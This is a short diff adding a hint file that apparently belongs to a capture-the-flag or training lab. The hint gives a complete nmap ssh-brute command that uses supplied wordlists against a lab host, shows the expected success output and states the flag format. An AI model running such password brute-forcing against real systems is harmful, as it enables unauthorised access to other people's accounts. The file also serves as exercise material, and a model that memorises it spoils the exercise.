@@ -1,0 +1,11 @@
+Hint: The NSE (Nmap Scripting Engine) includes built-in
+brute-force scripts. Use ssh-brute with the provided wordlists.
+
+  sudo nmap --script ssh-brute \
+    --script-args userdb=files/wordlists/ssh_users.txt,passdb=files/wordlists/ssh_passwords.txt \
+    -p 22 10.0.2.5
+
+When successful, the output will show:
+  "Login successful on port 22: 'admin' -- password: '...'"
+
+The flag format is: HT/<username>:<password>
